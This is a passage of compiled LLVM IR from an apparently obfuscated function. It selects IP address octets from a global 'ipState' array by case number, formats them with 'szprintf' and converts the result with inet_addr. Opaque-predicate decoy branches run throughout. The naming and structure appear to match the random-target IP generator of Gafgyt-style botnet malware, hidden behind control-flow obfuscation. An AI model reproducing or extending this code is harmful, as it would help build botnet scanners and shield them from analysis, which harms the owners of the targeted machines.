  %5056 = load i32, i32* @y.66
  %5057 = sub i32 %5055, 1
  %5058 = mul i32 %5055, %5057
  %5059 = urem i32 %5058, 2
  %5060 = icmp eq i32 %5059, 0
  %5061 = icmp slt i32 %5056, 10
  %5062 = or i1 %5060, %5061
  br i1 %5062, label %originalBBpart2612, label %originalBB610alteredBB

originalBBpart2612:                               ; preds = %originalBB610
  br i1 %5054, label %5063, label %5070

; <label>:5063:                                   ; preds = %originalBBpart2612
  %5064 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5065 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5066 = zext i8 %5065 to i32
  %5067 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5068 = zext i8 %5067 to i32
  %5069 = call i32 (i8*, i8*, ...) @szprintf(i8* %5064, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.749, i32 0, i32 0), i32 %5066, i32 %5068)
  br label %5070

; <label>:5070:                                   ; preds = %5063, %originalBBpart2612
  %5071 = load i32, i32* %1, align 4
  %5072 = icmp eq i32 %5071, 268
  br i1 %5072, label %5073, label %5080

; <label>:5073:                                   ; preds = %5070
  %5074 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5075 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5076 = zext i8 %5075 to i32
  %5077 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5078 = zext i8 %5077 to i32
  %5079 = call i32 (i8*, i8*, ...) @szprintf(i8* %5074, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.750, i32 0, i32 0), i32 %5076, i32 %5078)
  br label %5080

; <label>:5080:                                   ; preds = %5073, %5070
  %5081 = load i32, i32* %1, align 4
  %5082 = icmp eq i32 %5081, 269
  br i1 %5082, label %5083, label %5090

; <label>:5083:                                   ; preds = %5080
  %5084 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5085 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5086 = zext i8 %5085 to i32
  %5087 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5088 = zext i8 %5087 to i32
  %5089 = call i32 (i8*, i8*, ...) @szprintf(i8* %5084, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.852, i32 0, i32 0), i32 %5086, i32 %5088)
  br label %5090

; <label>:5090:                                   ; preds = %5083, %5080
  %5091 = load i32, i32* @x.65
  %5092 = load i32, i32* @y.66
  %5093 = sub i32 %5091, 1
  %5094 = mul i32 %5091, %5093
  %5095 = urem i32 %5094, 2
  %5096 = icmp eq i32 %5095, 0
  %5097 = icmp slt i32 %5092, 10
  %5098 = or i1 %5096, %5097
  br i1 %5098, label %originalBB614, label %originalBB614alteredBB

originalBB614:                                    ; preds = %originalBB614alteredBB, %5090
  %5099 = load i32, i32* %1, align 4
  %5100 = icmp eq i32 %5099, 270
  %5101 = load i32, i32* @x.65
  %5102 = load i32, i32* @y.66
  %5103 = sub i32 %5101, 1
  %5104 = mul i32 %5101, %5103
  %5105 = urem i32 %5104, 2
  %5106 = icmp eq i32 %5105, 0
  %5107 = icmp slt i32 %5102, 10
  %5108 = or i1 %5106, %5107
  br i1 %5108, label %originalBBpart2616, label %originalBB614alteredBB

originalBBpart2616:                               ; preds = %originalBB614
  br i1 %5100, label %5109, label %5116

; <label>:5109:                                   ; preds = %originalBBpart2616
  %5110 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5112 = zext i8 %5111 to i32
  %5113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5114 = zext i8 %5113 to i32
  %5115 = call i32 (i8*, i8*, ...) @szprintf(i8* %5110, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.751, i32 0, i32 0), i32 %5112, i32 %5114)
  br label %5116

; <label>:5116:                                   ; preds = %5109, %originalBBpart2616
  %5117 = load i32, i32* %1, align 4
  %5118 = icmp eq i32 %5117, 271
  br i1 %5118, label %5119, label %5126

; <label>:5119:                                   ; preds = %5116
  %5120 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5122 = zext i8 %5121 to i32
  %5123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5124 = zext i8 %5123 to i32
  %5125 = call i32 (i8*, i8*, ...) @szprintf(i8* %5120, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.752, i32 0, i32 0), i32 %5122, i32 %5124)
  br label %5126

; <label>:5126:                                   ; preds = %5119, %5116
  %5127 = load i32, i32* %1, align 4
  %5128 = icmp eq i32 %5127, 272
  br i1 %5128, label %5129, label %5136

; <label>:5129:                                   ; preds = %5126
  %5130 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5131 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5132 = zext i8 %5131 to i32
  %5133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5134 = zext i8 %5133 to i32
  %5135 = call i32 (i8*, i8*, ...) @szprintf(i8* %5130, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.753, i32 0, i32 0), i32 %5132, i32 %5134)
  br label %5136

; <label>:5136:                                   ; preds = %5129, %5126
  %5137 = load i32, i32* @x.65
  %5138 = load i32, i32* @y.66
  %5139 = sub i32 %5137, 1
  %5140 = mul i32 %5137, %5139
  %5141 = urem i32 %5140, 2
  %5142 = icmp eq i32 %5141, 0
  %5143 = icmp slt i32 %5138, 10
  %5144 = or i1 %5142, %5143
  br i1 %5144, label %originalBB618, label %originalBB618alteredBB

originalBB618:                                    ; preds = %originalBB618alteredBB, %5136
  %5145 = load i32, i32* %1, align 4
  %5146 = icmp eq i32 %5145, 273
  %5147 = load i32, i32* @x.65
  %5148 = load i32, i32* @y.66
  %5149 = sub i32 %5147, 1
  %5150 = mul i32 %5147, %5149
  %5151 = urem i32 %5150, 2
  %5152 = icmp eq i32 %5151, 0
  %5153 = icmp slt i32 %5148, 10
  %5154 = or i1 %5152, %5153
  br i1 %5154, label %originalBBpart2620, label %originalBB618alteredBB

originalBBpart2620:                               ; preds = %originalBB618
  br i1 %5146, label %5155, label %5162

; <label>:5155:                                   ; preds = %originalBBpart2620
  %5156 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5158 = zext i8 %5157 to i32
  %5159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5160 = zext i8 %5159 to i32
  %5161 = call i32 (i8*, i8*, ...) @szprintf(i8* %5156, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.853, i32 0, i32 0), i32 %5158, i32 %5160)
  br label %5162

; <label>:5162:                                   ; preds = %5155, %originalBBpart2620
  %5163 = load i32, i32* %1, align 4
  %5164 = icmp eq i32 %5163, 274
  br i1 %5164, label %5165, label %5172

; <label>:5165:                                   ; preds = %5162
  %5166 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5167 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5168 = zext i8 %5167 to i32
  %5169 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5170 = zext i8 %5169 to i32
  %5171 = call i32 (i8*, i8*, ...) @szprintf(i8* %5166, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.754, i32 0, i32 0), i32 %5168, i32 %5170)
  br label %5172

; <label>:5172:                                   ; preds = %5165, %5162
  %5173 = load i32, i32* %1, align 4
  %5174 = icmp eq i32 %5173, 275
  br i1 %5174, label %5175, label %5182

; <label>:5175:                                   ; preds = %5172
  %5176 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5178 = zext i8 %5177 to i32
  %5179 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5180 = zext i8 %5179 to i32
  %5181 = call i32 (i8*, i8*, ...) @szprintf(i8* %5176, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.755, i32 0, i32 0), i32 %5178, i32 %5180)
  br label %5182

; <label>:5182:                                   ; preds = %5175, %5172
  %5183 = load i32, i32* %1, align 4
  %5184 = icmp eq i32 %5183, 276
  br i1 %5184, label %5185, label %5192

; <label>:5185:                                   ; preds = %5182
  %5186 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5187 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5188 = zext i8 %5187 to i32
  %5189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5190 = zext i8 %5189 to i32
  %5191 = call i32 (i8*, i8*, ...) @szprintf(i8* %5186, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.756, i32 0, i32 0), i32 %5188, i32 %5190)
  br label %5192

; <label>:5192:                                   ; preds = %5185, %5182
  %5193 = load i32, i32* %1, align 4
  %5194 = icmp eq i32 %5193, 277
  br i1 %5194, label %5195, label %5218

; <label>:5195:                                   ; preds = %5192
  %5196 = load i32, i32* @x.65
  %5197 = load i32, i32* @y.66
  %5198 = sub i32 %5196, 1
  %5199 = mul i32 %5196, %5198
  %5200 = urem i32 %5199, 2
  %5201 = icmp eq i32 %5200, 0
  %5202 = icmp slt i32 %5197, 10
  %5203 = or i1 %5201, %5202
  br i1 %5203, label %originalBB622, label %originalBB622alteredBB

originalBB622:                                    ; preds = %originalBB622alteredBB, %5195
  %5204 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5206 = zext i8 %5205 to i32
  %5207 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5208 = zext i8 %5207 to i32
  %5209 = call i32 (i8*, i8*, ...) @szprintf(i8* %5204, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.757, i32 0, i32 0), i32 %5206, i32 %5208)
  %5210 = load i32, i32* @x.65
  %5211 = load i32, i32* @y.66
  %5212 = sub i32 %5210, 1
  %5213 = mul i32 %5210, %5212
  %5214 = urem i32 %5213, 2
  %5215 = icmp eq i32 %5214, 0
  %5216 = icmp slt i32 %5211, 10
  %5217 = or i1 %5215, %5216
  br i1 %5217, label %originalBBpart2624, label %originalBB622alteredBB

originalBBpart2624:                               ; preds = %originalBB622
  br label %5218

; <label>:5218:                                   ; preds = %originalBBpart2624, %5192
  %5219 = load i32, i32* %1, align 4
  %5220 = icmp eq i32 %5219, 278
  br i1 %5220, label %5221, label %5228

; <label>:5221:                                   ; preds = %5218
  %5222 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5224 = zext i8 %5223 to i32
  %5225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5226 = zext i8 %5225 to i32
  %5227 = call i32 (i8*, i8*, ...) @szprintf(i8* %5222, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.758, i32 0, i32 0), i32 %5224, i32 %5226)
  br label %5228

; <label>:5228:                                   ; preds = %5221, %5218
  %5229 = load i32, i32* %1, align 4
  %5230 = icmp eq i32 %5229, 279
  br i1 %5230, label %5231, label %5238

; <label>:5231:                                   ; preds = %5228
  %5232 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5234 = zext i8 %5233 to i32
  %5235 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5236 = zext i8 %5235 to i32
  %5237 = call i32 (i8*, i8*, ...) @szprintf(i8* %5232, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.854, i32 0, i32 0), i32 %5234, i32 %5236)
  br label %5238

; <label>:5238:                                   ; preds = %5231, %5228
  %5239 = load i32, i32* %1, align 4
  %5240 = icmp eq i32 %5239, 280
  br i1 %5240, label %5241, label %5248

; <label>:5241:                                   ; preds = %5238
  %5242 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5244 = zext i8 %5243 to i32
  %5245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5246 = zext i8 %5245 to i32
  %5247 = call i32 (i8*, i8*, ...) @szprintf(i8* %5242, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.855, i32 0, i32 0), i32 %5244, i32 %5246)
  br label %5248

; <label>:5248:                                   ; preds = %5241, %5238
  %5249 = load i32, i32* @x.65
  %5250 = load i32, i32* @y.66
  %5251 = sub i32 %5249, 1
  %5252 = mul i32 %5249, %5251
  %5253 = urem i32 %5252, 2
  %5254 = icmp eq i32 %5253, 0
  %5255 = icmp slt i32 %5250, 10
  %5256 = or i1 %5254, %5255
  br i1 %5256, label %originalBB626, label %originalBB626alteredBB

originalBB626:                                    ; preds = %originalBB626alteredBB, %5248
  %5257 = load i32, i32* %1, align 4
  %5258 = icmp eq i32 %5257, 281
  %5259 = load i32, i32* @x.65
  %5260 = load i32, i32* @y.66
  %5261 = sub i32 %5259, 1
  %5262 = mul i32 %5259, %5261
  %5263 = urem i32 %5262, 2
  %5264 = icmp eq i32 %5263, 0
  %5265 = icmp slt i32 %5260, 10
  %5266 = or i1 %5264, %5265
  br i1 %5266, label %originalBBpart2628, label %originalBB626alteredBB

originalBBpart2628:                               ; preds = %originalBB626
  br i1 %5258, label %5267, label %5274

; <label>:5267:                                   ; preds = %originalBBpart2628
  %5268 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5270 = zext i8 %5269 to i32
  %5271 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5272 = zext i8 %5271 to i32
  %5273 = call i32 (i8*, i8*, ...) @szprintf(i8* %5268, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.856, i32 0, i32 0), i32 %5270, i32 %5272)
  br label %5274

; <label>:5274:                                   ; preds = %5267, %originalBBpart2628
  %5275 = load i32, i32* %1, align 4
  %5276 = icmp eq i32 %5275, 282
  br i1 %5276, label %5277, label %5284

; <label>:5277:                                   ; preds = %5274
  %5278 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5279 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5280 = zext i8 %5279 to i32
  %5281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5282 = zext i8 %5281 to i32
  %5283 = call i32 (i8*, i8*, ...) @szprintf(i8* %5278, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.857, i32 0, i32 0), i32 %5280, i32 %5282)
  br label %5284

; <label>:5284:                                   ; preds = %5277, %5274
  %5285 = load i32, i32* %1, align 4
  %5286 = icmp eq i32 %5285, 283
  br i1 %5286, label %5287, label %5294

; <label>:5287:                                   ; preds = %5284
  %5288 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5290 = zext i8 %5289 to i32
  %5291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5292 = zext i8 %5291 to i32
  %5293 = call i32 (i8*, i8*, ...) @szprintf(i8* %5288, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.667, i32 0, i32 0), i32 %5290, i32 %5292)
  br label %5294

; <label>:5294:                                   ; preds = %5287, %5284
  %5295 = load i32, i32* %1, align 4
  %5296 = icmp eq i32 %5295, 284
  br i1 %5296, label %5297, label %5320

; <label>:5297:                                   ; preds = %5294
  %5298 = load i32, i32* @x.65
  %5299 = load i32, i32* @y.66
  %5300 = sub i32 %5298, 1
  %5301 = mul i32 %5298, %5300
  %5302 = urem i32 %5301, 2
  %5303 = icmp eq i32 %5302, 0
  %5304 = icmp slt i32 %5299, 10
  %5305 = or i1 %5303, %5304
  br i1 %5305, label %originalBB630, label %originalBB630alteredBB

originalBB630:                                    ; preds = %originalBB630alteredBB, %5297
  %5306 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5307 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5308 = zext i8 %5307 to i32
  %5309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5310 = zext i8 %5309 to i32
  %5311 = call i32 (i8*, i8*, ...) @szprintf(i8* %5306, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.858, i32 0, i32 0), i32 %5308, i32 %5310)
  %5312 = load i32, i32* @x.65
  %5313 = load i32, i32* @y.66
  %5314 = sub i32 %5312, 1
  %5315 = mul i32 %5312, %5314
  %5316 = urem i32 %5315, 2
  %5317 = icmp eq i32 %5316, 0
  %5318 = icmp slt i32 %5313, 10
  %5319 = or i1 %5317, %5318
  br i1 %5319, label %originalBBpart2632, label %originalBB630alteredBB

originalBBpart2632:                               ; preds = %originalBB630
  br label %5320

; <label>:5320:                                   ; preds = %originalBBpart2632, %5294
  %5321 = load i32, i32* @x.65
  %5322 = load i32, i32* @y.66
  %5323 = sub i32 %5321, 1
  %5324 = mul i32 %5321, %5323
  %5325 = urem i32 %5324, 2
  %5326 = icmp eq i32 %5325, 0
  %5327 = icmp slt i32 %5322, 10
  %5328 = or i1 %5326, %5327
  br i1 %5328, label %originalBB634, label %originalBB634alteredBB

originalBB634:                                    ; preds = %originalBB634alteredBB, %5320
  %5329 = load i32, i32* %1, align 4
  %5330 = icmp eq i32 %5329, 285
  %5331 = load i32, i32* @x.65
  %5332 = load i32, i32* @y.66
  %5333 = sub i32 %5331, 1
  %5334 = mul i32 %5331, %5333
  %5335 = urem i32 %5334, 2
  %5336 = icmp eq i32 %5335, 0
  %5337 = icmp slt i32 %5332, 10
  %5338 = or i1 %5336, %5337
  br i1 %5338, label %originalBBpart2636, label %originalBB634alteredBB

originalBBpart2636:                               ; preds = %originalBB634
  br i1 %5330, label %5339, label %5346

; <label>:5339:                                   ; preds = %originalBBpart2636
  %5340 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5342 = zext i8 %5341 to i32
  %5343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5344 = zext i8 %5343 to i32
  %5345 = call i32 (i8*, i8*, ...) @szprintf(i8* %5340, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.669, i32 0, i32 0), i32 %5342, i32 %5344)
  br label %5346

; <label>:5346:                                   ; preds = %5339, %originalBBpart2636
  %5347 = load i32, i32* %1, align 4
  %5348 = icmp eq i32 %5347, 287
  br i1 %5348, label %5349, label %5372

; <label>:5349:                                   ; preds = %5346
  %5350 = load i32, i32* @x.65
  %5351 = load i32, i32* @y.66
  %5352 = sub i32 %5350, 1
  %5353 = mul i32 %5350, %5352
  %5354 = urem i32 %5353, 2
  %5355 = icmp eq i32 %5354, 0
  %5356 = icmp slt i32 %5351, 10
  %5357 = or i1 %5355, %5356
  br i1 %5357, label %originalBB638, label %originalBB638alteredBB

originalBB638:                                    ; preds = %originalBB638alteredBB, %5349
  %5358 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5359 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5360 = zext i8 %5359 to i32
  %5361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5362 = zext i8 %5361 to i32
  %5363 = call i32 (i8*, i8*, ...) @szprintf(i8* %5358, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.664, i32 0, i32 0), i32 %5360, i32 %5362)
  %5364 = load i32, i32* @x.65
  %5365 = load i32, i32* @y.66
  %5366 = sub i32 %5364, 1
  %5367 = mul i32 %5364, %5366
  %5368 = urem i32 %5367, 2
  %5369 = icmp eq i32 %5368, 0
  %5370 = icmp slt i32 %5365, 10
  %5371 = or i1 %5369, %5370
  br i1 %5371, label %originalBBpart2640, label %originalBB638alteredBB

originalBBpart2640:                               ; preds = %originalBB638
  br label %5372

; <label>:5372:                                   ; preds = %originalBBpart2640, %5346
  %5373 = load i32, i32* @x.65
  %5374 = load i32, i32* @y.66
  %5375 = sub i32 %5373, 1
  %5376 = mul i32 %5373, %5375
  %5377 = urem i32 %5376, 2
  %5378 = icmp eq i32 %5377, 0
  %5379 = icmp slt i32 %5374, 10
  %5380 = or i1 %5378, %5379
  br i1 %5380, label %originalBB642, label %originalBB642alteredBB

originalBB642:                                    ; preds = %originalBB642alteredBB, %5372
  %5381 = load i32, i32* %1, align 4
  %5382 = icmp eq i32 %5381, 288
  %5383 = load i32, i32* @x.65
  %5384 = load i32, i32* @y.66
  %5385 = sub i32 %5383, 1
  %5386 = mul i32 %5383, %5385
  %5387 = urem i32 %5386, 2
  %5388 = icmp eq i32 %5387, 0
  %5389 = icmp slt i32 %5384, 10
  %5390 = or i1 %5388, %5389
  br i1 %5390, label %originalBBpart2644, label %originalBB642alteredBB

originalBBpart2644:                               ; preds = %originalBB642
  br i1 %5382, label %5391, label %5398

; <label>:5391:                                   ; preds = %originalBBpart2644
  %5392 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5394 = zext i8 %5393 to i32
  %5395 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5396 = zext i8 %5395 to i32
  %5397 = call i32 (i8*, i8*, ...) @szprintf(i8* %5392, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.673, i32 0, i32 0), i32 %5394, i32 %5396)
  br label %5398

; <label>:5398:                                   ; preds = %5391, %originalBBpart2644
  %5399 = load i32, i32* %1, align 4
  %5400 = icmp eq i32 %5399, 289
  br i1 %5400, label %5401, label %5408

; <label>:5401:                                   ; preds = %5398
  %5402 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5403 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5404 = zext i8 %5403 to i32
  %5405 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5406 = zext i8 %5405 to i32
  %5407 = call i32 (i8*, i8*, ...) @szprintf(i8* %5402, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.675, i32 0, i32 0), i32 %5404, i32 %5406)
  br label %5408

; <label>:5408:                                   ; preds = %5401, %5398
  %5409 = load i32, i32* %1, align 4
  %5410 = icmp eq i32 %5409, 290
  br i1 %5410, label %5411, label %5418

; <label>:5411:                                   ; preds = %5408
  %5412 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5414 = zext i8 %5413 to i32
  %5415 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5416 = zext i8 %5415 to i32
  %5417 = call i32 (i8*, i8*, ...) @szprintf(i8* %5412, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.859, i32 0, i32 0), i32 %5414, i32 %5416)
  br label %5418

; <label>:5418:                                   ; preds = %5411, %5408
  %5419 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5420 = call i32 @inet_addr(i8* %5419) #5
  ret i32 %5420

originalBBalteredBB:                              ; preds = %originalBB, %26
  %5421 = load i32, i32* %1, align 4
  %5422 = icmp eq i32 %5421, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %5423 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5424 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5425 = zext i8 %5424 to i32
  %5426 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5427 = zext i8 %5426 to i32
  %5428 = call i32 (i8*, i8*, ...) @szprintf(i8* %5423, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.678, i32 0, i32 0), i32 %5425, i32 %5427)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %5429 = load i32, i32* %1, align 4
  %5430 = icmp eq i32 %5429, 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %94
  %5431 = load i32, i32* %1, align 4
  %5432 = icmp eq i32 %5431, 3
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %130
  %5433 = load i32, i32* %1, align 4
  %5434 = icmp eq i32 %5433, 5
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %156
  %5435 = load i32, i32* %1, align 4
  %5436 = icmp eq i32 %5435, 6
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %215
  %5437 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5438 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5439 = zext i8 %5438 to i32
  %5440 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5441 = zext i8 %5440 to i32
  %5442 = call i32 (i8*, i8*, ...) @szprintf(i8* %5437, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.661, i32 0, i32 0), i32 %5439, i32 %5441)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %241
  %5443 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5444 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5445 = zext i8 %5444 to i32
  %5446 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5447 = zext i8 %5446 to i32
  %5448 = call i32 (i8*, i8*, ...) @szprintf(i8* %5443, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.663, i32 0, i32 0), i32 %5445, i32 %5447)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %284
  %5449 = load i32, i32* %1, align 4
  %5450 = icmp eq i32 %5449, 14
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %310
  %5451 = load i32, i32* %1, align 4
  %5452 = icmp eq i32 %5451, 15
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %329
  %5453 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5454 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5455 = zext i8 %5454 to i32
  %5456 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5457 = zext i8 %5456 to i32
  %5458 = call i32 (i8*, i8*, ...) @szprintf(i8* %5453, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.689, i32 0, i32 0), i32 %5455, i32 %5457)
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %365
  %5459 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5460 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %5461 = zext i8 %5460 to i32
  %5462 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5463 = zext i8 %5462 to i32
